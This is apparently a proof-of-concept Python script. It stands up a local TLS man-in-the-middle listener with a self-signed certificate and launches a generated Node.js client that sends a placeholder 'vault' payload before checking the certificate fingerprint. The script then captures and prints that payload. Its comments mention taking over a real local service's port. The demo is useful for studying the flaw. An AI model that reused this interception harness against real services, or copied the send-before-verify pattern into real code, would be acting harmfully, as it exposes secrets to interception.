import socket
import ssl
import sys

# Bind to an alternative port just to test if the concept holds,
# or we can kill the server and bind to 8420.
import subprocess
try:
    subprocess.run("openssl req -x509 -newkey rsa:2048 -keyout fake_key.pem -out fake_cert.pem -days 1 -nodes -subj '/CN=localhost'", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile="fake_cert.pem", keyfile="fake_key.pem")
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Notice we bind to 8421 for now just to prove it, but we could take over 8420 if the server dies
    server_socket.bind(('127.0.0.1', 8421))
    server_socket.listen(1)
    
    print("MITM Listening on 8421. Ready to capture.")
    
    # We write a node script to hit 8421 instead to simulate the exact node.js behavior
    node_script = """
const https = require('https');
const fs = require('fs');

const payload = Buffer.from('TOP_SECRET_VAULT_PAYLOAD', 'utf-8');

const req = https.request('https://127.0.0.1:8421/test', {
  method: 'POST',
  rejectUnauthorized: false
});

req.on('response', (res) => {
    const cert = res.socket.getPeerCertificate();
    if (!cert || cert.fingerprint256 !== 'REAL_FINGERPRINT') {
        console.log("Fingerprint mismatch detected! Aborting request.");
        req.destroy();
        return false;
    }
    console.log("Fingerprint valid!");
});

req.on('error', (err) => {
    console.log("Req Error: ", err.message);
});

// The vulnerability: req.end() sends the payload before response validation!
req.end(payload);
"""
    with open("test_node.js", "w") as f:
        f.write(node_script)
        
    subprocess.Popen(["node", "test_node.js"])
    
    conn, addr = server_socket.accept()
    ssl_conn = context.wrap_socket(conn, server_side=True)
    data = ssl_conn.recv(8192)
    print("----- MITM CAPTURE -----")
    print(data.decode('utf-8', 'replace'))
    print("------------------------")
    
    ssl_conn.sendall(b"HTTP/1.1 200 OK\r\nConnection: close\r\n\r\nMITM Response")
    ssl_conn.close()
    server_socket.close()
except Exception as e:
    print(e)
